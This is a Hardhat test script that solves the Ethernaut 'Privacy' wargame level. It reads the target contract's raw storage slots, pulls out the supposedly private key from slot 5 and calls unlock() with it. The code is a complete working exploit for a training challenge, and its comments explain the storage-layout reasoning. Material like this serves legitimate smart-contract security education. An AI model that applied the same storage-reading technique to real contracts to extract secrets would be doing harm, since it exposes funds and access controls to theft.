import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`Privacy`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
    `0x11343d543778213221516D004ED82C45C3c8788B`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Update this to match your attack contract
  //const attackerFactory = await ethers.getContractFactory(`CoinFlipAttacker`);
  //attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    console.log("Contract storage:");
    for (let i = 0; i < 8; i++) {
        console.log(i + ": " +
            await ethers.provider.getStorageAt(
                challenge.address,
                i
            )
        );
    }

    // The key is stored in the 6th slot of 32 bytes (starting at index 0) in the target contract:
    // - bool takes up one slot (slot 0)
    // - uint256 takes up an entire slot (slot 1)
    // - uint8, uint8, and uint16 add up to one 32 bit slot (slot 2)
    // - the data array takes up 4 32 bit slots (slots 3-6)
    // Key is stored in the 3rd slot of data (starting at index 0) --> slot 5
    const keyIndex = 5;
    const keySlot = await ethers.provider.getStorageAt(
        challenge.address,
        keyIndex
    );

    // Get first 16 bytes of keySlot
    const key = ethers.utils.hexDataSlice(keySlot, 0, 16);
    console.log(`Key: ${key}`);

    await challenge.unlock(key);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
